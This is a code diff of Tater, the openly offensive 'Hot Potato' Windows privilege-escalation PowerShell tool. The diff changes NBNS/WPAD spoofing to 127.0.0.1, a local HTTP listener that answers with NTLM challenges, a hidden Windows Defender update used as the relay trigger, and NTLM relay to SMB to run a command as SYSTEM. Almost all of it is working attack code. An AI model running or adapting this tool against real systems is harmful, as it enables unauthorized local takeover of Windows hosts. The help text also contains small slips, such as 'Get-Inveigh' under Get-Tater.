@@ -13,12 +13,6 @@ Specify a specific local IP address.
 .PARAMETER Command
 Command to execute as SYSTEM on the localhost.
 
-.PARAMETER NBNS
-Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofing. If disabled, another method of spoofing will need to be employed such as an LLMNR/NBNS spoofer running on another system and pointing to 127.0.0.1. 
-
-.PARAMETER Trigger
-Default = Enabled: (Y/N) Enable/Disable the Windows Defender signature updates. If disabled, another method will need to be employed to trigger a relay.
-
 .PARAMETER RunTime
 (Integer) Set the run time duration in minutes.
 
@@ -30,6 +24,10 @@ Default = Disabled: (Y/N) Enable/Disable real time file output.
 
 .PARAMETER StatusOutput
 Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
+
+.PARAMETER OutputStreamOnly
+Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams.
+Note that you will not see the various yellow warning messages if enabled.
 
 .PARAMETER ShowHelp
 Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
@@ -48,16 +46,15 @@ https://github.com/Kevin-Robertson/Tater
 # Default parameter values can be modified in this section 
 param
 ( 
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$NBNS="Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Trigger="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$OutputStreamOnly="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Tool="0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP="",
     [parameter(Mandatory=$false)][int]$RunTime = "",
-    [parameter(Mandatory=$true)][string]$Command = "",
-    [parameter(Mandatory=$false)][string]$Hostname = "WPAD",  
+    [parameter(Mandatory=$true)][string]$Command = "", 
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
 
@@ -107,15 +104,26 @@ else
     $tater.status_output = $false
 }
 
+if($OutputStreamOnly -eq 'y')
+{
+    $tater.output_stream_only = $true
+}
+else
+{
+    $tater.output_stream_only = $false
+}
+
 if($Tool -eq 1) # Metasploit Interactive Powershell
 {
     $tater.tool = 1
+    $tater.output_stream_only = $true
     $tater.newline = ""
     $ConsoleOutput = "N"
 }
 elseif($Tool -eq 2) # PowerShell Empire
 {
     $tater.tool = 2
+    $tater.output_stream_only = $true
     $tater.console_input = $false
     $tater.newline = "`n"
     $ConsoleOutput = "Y"
@@ -128,22 +136,8 @@ else
 }
 
 # Write startup messages
-$tater.status_queue.add("$(Get-Date -format 's') - Tater (Hot Potato Privilege Escalation) started")|Out-Null
+$tater.status_queue.add("$(Get-Date -format 's') - Tater (Hot Potato–Windows Privilege Escalation) started")|Out-Null
 $tater.status_queue.add("Local IP Address = $IP") |Out-Null
-
-if($NBNS -eq 'y')
-{
-    $tater.status_queue.add("Spoofing Hostname $Hostname")|Out-Null
-}
-else
-{
-    $tater.status_queue.add("NBNS Bruteforce Spoofing Disabled")|Out-Null
-}
-
-if($Trigger -eq 'n')
-{
-    $tater.status_queue.add("Relay Trigger Disabled")|Out-Null
-}
 
 if($ConsoleOutput -eq 'y')
 {
@@ -161,7 +155,6 @@ else
         $tater.status_queue.add("Real Time Console Output Disabled")|Out-Null
     }
 }
-
 if($RunTime -eq '1')
 {
     $tater.status_queue.add("Run Time = $RunTime Minute")|Out-Null
@@ -187,8 +180,27 @@ if($tater.status_output)
 {
     while($tater.status_queue.Count -gt 0)
     {
-        write-output($tater.status_queue[0] + $tater.newline)
-        $tater.status_queue.RemoveRange(0,1)
+        if($tater.output_stream_only)
+        {
+            write-output($tater.status_queue[0] + $tater.newline)
+            $tater.status_queue.RemoveRange(0,1)
+        }
+        else
+        {
+            switch ($tater.status_queue[0])
+            {
+                "Run Stop-Tater to stop Tater"
+                {
+                    write-warning($tater.status_queue[0])
+                    $tater.status_queue.RemoveRange(0,1)
+                }
+                default
+                {
+                    write-output($tater.status_queue[0])
+                    $tater.status_queue.RemoveRange(0,1)
+                }
+            }
+        }
     }
 }
 
@@ -231,20 +243,6 @@ $shared_basic_functions_scriptblock =
         $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
         return $string_extract
-    }
-
-    Function HTTPListenerStop
-    {
-        $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
-        $tater.HTTP_client.Close()
-        start-sleep -s 1
-        $tater.HTTP_listener.server.blocking = $false
-        Start-Sleep -s 1
-        $tater.HTTP_listener.server.Close()
-        Start-Sleep -s 1
-        $tater.HTTP_listener.Stop()
-        $tater.running = $false
-        break HTTP_listener_loop
     }
 }
 
@@ -700,26 +698,36 @@ $HTTP_scriptblock =
     {
         if($tater.SMBRelay_success)
         {
-            HTTPListenerStop
+            #$HTTP_stream.close()
+            $tater.HTTP_client.Close()
+            $tater.HTTP_client.dispose()
+            $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
+            start-sleep -s 1
+            $tater.HTTP_client.close()
+            $tater.HTTP_client.dispose()
+            start-sleep -s 1
+            $tater.running = $false
+            break HTTP_listener_loop
         }
 
+        $tater.message = ''
         $TCP_request = $NULL
         $TCP_request_bytes = New-Object System.Byte[] 1024
 
-        $suppress_waiting_message = $false
-
         while(!$tater.HTTP_listener.Pending() -and !$tater.HTTP_client.Connected)
         {
-            if(!$suppress_waiting_message)
-            {
-                $tater.console_queue.add("$(Get-Date -format 's') - Waiting for incoming HTTP connection")
-                $suppress_waiting_message = $true
-            }
+            $tater.console_queue.add("$(Get-Date -format 's') - Waiting for incoming HTTP connection...")
             Start-Sleep -s 1
 
             if($tater.SMBRelay_success)
             {
-                HTTPListenerStop
+                $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
+                start-sleep -s 1
+                $tater.HTTP_client.close()
+                $tater.HTTP_client.dispose()
+                start-sleep -s 1
+                $tater.running = $false
+                break HTTP_listener_loop
             }
         }
 
@@ -776,6 +784,7 @@ $HTTP_scriptblock =
 
             $NTLM = ''
             $HTTP_request_type = "WPAD"
+            $tracker = "No"
         }
         elseif ($tater.request_RawUrl -eq '/GETHASHES')
         {
@@ -784,6 +793,7 @@ $HTTP_scriptblock =
             #$HTTP_response_phrase = (0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64)
             $NTLM = 'NTLM'
             $HTTP_request_type = "NTLM"
+            $tracker = "Yes"
         }
         else
         {
@@ -798,10 +808,8 @@ $HTTP_scriptblock =
             $HTTP_response_phrase = (0x4f,0x4b)
             $NTLM = ''
             $HTTP_request_type = "Redirect"
-            $tater.console_queue.add("$(Get-Date -format 's') - Attempting to redirect http://localhost/gethashes and trigger relay")
+            $tracker = "No"
         }
-
-        $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $tater.request_RawUrl + " received from " + $tater.HTTP_client.Client.RemoteEndpoint.Address)
 
         if($authentication_header.startswith('NTLM '))
         {
@@ -812,6 +820,7 @@ $HTTP_scriptblock =
             
             if ($HTTP_request_bytes[8] -eq 1)
             {
+                $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $tater.request_RawUrl + " received from " + $tater.HTTP_client.Client.RemoteEndpoint.Address)
 
                 if(($tater.SMB_relay) -and ($tater.SMB_relay_active_step -eq 0)) # -and ($tater.request.RemoteEndpoint.Address -ne $SMBRelayTarget))
                 {
@@ -941,6 +950,7 @@ $HTTP_scriptblock =
         if($NTLM)
         {
             $NTLM = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
+            $marker = "1"
             [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                 + $tater.response_StatusCode`
                 + (0x20)`
@@ -957,6 +967,7 @@ $HTTP_scriptblock =
         }
         elseif($HTTP_request_type -eq 'WPAD')
         {
+            $marker = "2"
             [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                 + $tater.response_StatusCode`
                 + (0x20)`
@@ -972,6 +983,7 @@ $HTTP_scriptblock =
         }
         elseif($HTTP_request_type -eq 'Redirect')
         {
+            $marker = "3"
             [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                 + $tater.response_StatusCode`
                 + (0x20)`
@@ -986,6 +998,7 @@ $HTTP_scriptblock =
         }
         else
         {
+            $marker = "1"
             [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x20)`
                 + $tater.response_StatusCode`
                 + (0x20)`
@@ -997,43 +1010,32 @@ $HTTP_scriptblock =
                 + $HTTP_timestamp`
                 + (0x0d,0x0a,0x0d,0x0a)`
         }
+
+
+        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($tater.message)
         
         $HTTP_stream.write($HTTP_response, 0, $HTTP_response.length)
         $HTTP_stream.Flush()
         start-sleep -s 1
+        
+        #}
+
+        #$tater.HTTP_client.getstream.close()
+        #$tater.HTTP_client.Close()
 
     }
 
+    #$tater.HTTP_listener.Stop()
+    #$tater.HTTP_listener.Close()
 }
 
 $spoofer_scriptblock = 
 {
-    param ($IP,$Hostname)
-
-    $Hostname = $Hostname.ToUpper()
-
-    [Byte[]]$hostname_bytes = (0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00)
-
-    $hostname_encoded = [System.Text.Encoding]::ASCII.GetBytes($Hostname)
-    $hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)
-    $hostname_encoded = $hostname_encoded.Replace("-","")
-    $hostname_encoded = [System.Text.Encoding]::ASCII.GetBytes($hostname_encoded)
-
-    for ($i=0; $i -lt $hostname_encoded.Count; $i++)
-    {
-        if($hostname_encoded[$i] -gt 64)
-        {
-            $hostname_bytes[$i] = $hostname_encoded[$i] + 10
-        }
-        else
-        {
-            $hostname_bytes[$i] = $hostname_encoded[$i] + 17
-        }
-    }
+    param ($IP)
 
     [Byte[]]$NBNS_response_packet = (0x00,0x00)`
         + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
-        + $hostname_bytes`
+        + (0x46,0x48,0x46,0x41,0x45,0x42,0x45,0x45,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00)`
         + (0x00,0x20,0x00,0x01,0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00,0x7f,0x00,0x00,0x01)`
         + (0x00,0x00,0x00,0x00)
                 
@@ -1060,21 +1062,7 @@ $spoofer_scriptblock =
 
  $tater_scriptblock = 
 {
-    param ($NBNS,$RunTime,$Hostname,$Trigger)
-    
-    Function HTTPListenerStop
-    {
-        $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
-        $tater.HTTP_client.Close()
-        start-sleep -s 1
-        $tater.HTTP_listener.server.blocking = $false
-        Start-Sleep -s 1
-        $tater.HTTP_listener.server.Close()
-        Start-Sleep -s 1
-        $tater.HTTP_listener.Stop()
-        $tater.running = $false
-        break HTTP_listener_loop
-    }
+    param ($RunTime)
 
     if($RunTime)
     {    
@@ -1084,40 +1072,42 @@ $spoofer_scriptblock =
 
     while ($tater.running)
     {
-        try
+       try
         {
-            $Hostname_IP = [System.Net.Dns]::GetHostEntry($Hostname).AddressList[0].IPAddressToString
+            $WPAD_IP = [System.Net.Dns]::GetHostEntry("wpad").AddressList[0].IPAddressToString
         }
         catch{}
             
-        if($Hostname_IP -eq "127.0.0.1" -and !$suppress_spoofed_message)
+        if($WPAD_IP -eq "127.0.0.1")
         {
-            $tater.console_queue.add("$(Get-Date -format 's') - $Hostname has been spoofed to 127.0.0.1")
-            $suppress_spoofed_message = $true
-            $hostname_spoof = $true
-            $Hostname_IP = ""
+            if(!$tater.WPAD_spoof)
+            {
+                $tater.console_queue.add("$(Get-Date -format 's') - WPAD has been spoofed")
+            }
+
+            $tater.WPAD_spoof = $true
+            $WPAD_IP = ""
         }
-        elseif((!$Hostname_IP -or $Hostname_IP -ne "127.0.0.1") -and $NBNS -eq 'y')
+        else
         {
-            $tater.console_queue.add("$(Get-Date -format 's') - Attempting to spoof $Hostname to 127.0.0.1")
-            $suppress_spoofed_message = $false
-            $hostname_spoof = $false
+            if($tater.WPAD_spoof)
+            {
+                $tater.console_queue.add("$(Get-Date -format 's') - Trying to spoof WPAD...")
+            }
+            $tater.WPAD_spoof = $false
         }
 
-        if(!$tater.SMBRelay_success -and $Trigger -eq 'y')
+        if(Test-Path "C:\Program Files\Windows Defender\MpCmdRun.exe")
         {
-            if(Test-Path "C:\Program Files\Windows Defender\MpCmdRun.exe")
+            if(($process_defender.HasExited -or !$process_defender) -and !$tater.SMB_relay_success -and $tater.WPAD_spoof)
             {
-                if(($process_defender.HasExited -or !$process_defender) -and !$tater.SMB_relay_success -and $hostname_spoof)
-                {
-                    $process_defender = Start-Process -FilePath "C:\Program Files\Windows Defender\MpCmdRun.exe" -Argument SignatureUpdate -WindowStyle Hidden -passthru
-                    $tater.console_queue.add("$(Get-Date -format 's') - Starting Windows Defender signature update")
-                }
+                $process_defender = Start-Process -FilePath "C:\Program Files\Windows Defender\MpCmdRun.exe" -Argument SignatureUpdate -WindowStyle Hidden -passthru
+                $tater.console_queue.add("$(Get-Date -format 's') - Starting Windows Defender signature update...")
             }
-            else
-            {
-                $tater.console_queue.add("Windows Defender not found")
-            }
+        }
+        else
+        {
+            $tater.console_queue.add("Windows Defender not found")
         }
 
         if($tater.SMBRelay_success)
@@ -1129,7 +1119,13 @@ $spoofer_scriptblock =
         {
             if($tater_stopwatch.elapsed -ge $tater_timeout)
             {
-                HTTPListenerStop
+                $tater.running = $false
+                $tater.HTTP_listener.server.blocking = $false
+                Start-Sleep -s 1
+                $tater.HTTP_listener.server.Close()
+                Start-Sleep -s 1
+                $tater.HTTP_listener.Stop()
+                $tater.SMBRelay_success = $false
             }
         } 
            
@@ -1167,11 +1163,11 @@ Function Spoofer()
     $spoofer_powershell.Runspace = $spoofer_runspace
     $spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $spoofer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
-    $spoofer_powershell.AddScript($spoofer_scriptblock).AddArgument($IP).AddArgument($Hostname) > $null
+    $spoofer_powershell.AddScript($spoofer_scriptblock).AddArgument($IP) > $null
     $spoofer_handle = $spoofer_powershell.BeginInvoke()
 }
 
-# Tater Loop Function
+# Spoofer Startup Function
 Function TaterLoop()
 {
     $tater_runspace = [runspacefactory]::CreateRunspace()
@@ -1179,7 +1175,7 @@ Function TaterLoop()
     $tater_runspace.SessionStateProxy.SetVariable('tater',$tater)
     $tater_powershell = [powershell]::Create()
     $tater_powershell.Runspace = $tater_runspace
-    $tater_powershell.AddScript($tater_scriptblock).AddArgument($NBNS).AddArgument($RunTime).AddArgument($Hostname).AddArgument($Trigger) > $null
+    $tater_powershell.AddScript($tater_scriptblock).AddArgument($RunTime) > $null
     $tater_handle = $tater_powershell.BeginInvoke()
 }
 
@@ -1187,10 +1183,7 @@ Function TaterLoop()
 HTTPListener
 
 # Spoofer Start
-if($NBNS -eq 'y')
-{
-    Spoofer
-}
+Spoofer
 
 # Tater Loop Start
 TaterLoop
@@ -1202,8 +1195,23 @@ if($tater.console_output)
     {
         while($tater.console_queue.Count -gt 0)
         {
-            write-output($tater.console_queue[0] + $tater.newline)
-            $tater.console_queue.RemoveRange(0,1)
+            if($tater.output_stream_only)
+            {
+                write-output($tater.console_queue[0] + $tater.newline)
+                $tater.console_queue.RemoveRange(0,1)
+            }
+            else
+            {
+                switch -wildcard ($tater.console_queue[0])
+                {
+                    default
+                    {
+                        write-output $tater.console_queue[0]
+                        $tater.console_queue.RemoveRange(0,1)
+                    }
+                } 
+            } 
+
         }
 
         if($tater.console_input)
@@ -1219,19 +1227,13 @@ if($tater.console_output)
     }
 }
 
-if(!$tater.running)
-{
-    if($tater.SMBRelay_success)
-    {  
-        $tater.SMBRelay_success = $false
-        Write-Output "$(Get-Date -format 's') - Tater was successful and has exited"
-    }
-    else
-    {
-        Write-Output "$(Get-Date -format 's') - Tater was not successful and has exited"
-    }
-}
-
+$tater.HTTP_listener.server.blocking = $false
+Start-Sleep -s 1
+$tater.HTTP_listener.server.Close()
+Start-Sleep -s 1
+$tater.HTTP_listener.Stop()
+$tater.SMBRelay_success = $false
+Write-Output "$(Get-Date -format 's') - Tater has exited"
 }
 #End Invoke-Tater
 
@@ -1245,15 +1247,16 @@ Function Stop-Tater
     {
         if($tater.running)
         {
-            $tater.status_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")|Out-Null
+            $tater.running = $false
+            Start-Sleep -s 1
             $tater.HTTP_listener.server.blocking = $false
             Start-Sleep -s 1
             $tater.HTTP_listener.server.Close()
             Start-Sleep -s 1
             $tater.HTTP_listener.Stop()
             $tater.SMBRelay_success = $false
-            $tater.running = $false
-            $tater.status_queue.add("$(Get-Date -format 's') - Tater has been stopped")|Out-Null
+
+            $tater.status_queue.add("Tater exited at $(Get-Date -format 's')")|Out-Null
         }
         else
         {
@@ -1269,8 +1272,16 @@ Function Stop-Tater
     {
         while($tater.status_queue.Count -gt 0)
         {
-            write-output($tater.status_queue[0] + $tater.newline)
-            $tater.status_queue.RemoveRange(0,1)
+            if($tater.output_stream_only)
+            {
+                write-output($tater.status_queue[0] + $tater.newline)
+                $tater.status_queue.RemoveRange(0,1)
+            }
+            else
+            {
+                write-output $tater.status_queue[0]
+                $tater.status_queue.RemoveRange(0,1)
+            }   
         }
     }
 } 
@@ -1279,11 +1290,19 @@ Function Get-Tater
 {
     <#
     .SYNOPSIS
-    Get-Tater will display queued Tater output.
+    Get-Inveigh will display queued Tater output.
     #>
     while($tater.console_queue.Count -gt 0)
     {
-        write-output($tater.console_queue[0] + $tater.newline)
-        $tater.console_queue.RemoveRange(0,1)
+        if($tater.output_stream_only)
+        {
+            write-output($tater.console_queue[0] + $tater.newline)
+            $tater.console_queue.RemoveRange(0,1)
+        }
+        else
+        {
+            write-output $tater.console_queue[0]
+            $tater.console_queue.RemoveRange(0,1)
+        }    
     }
 }
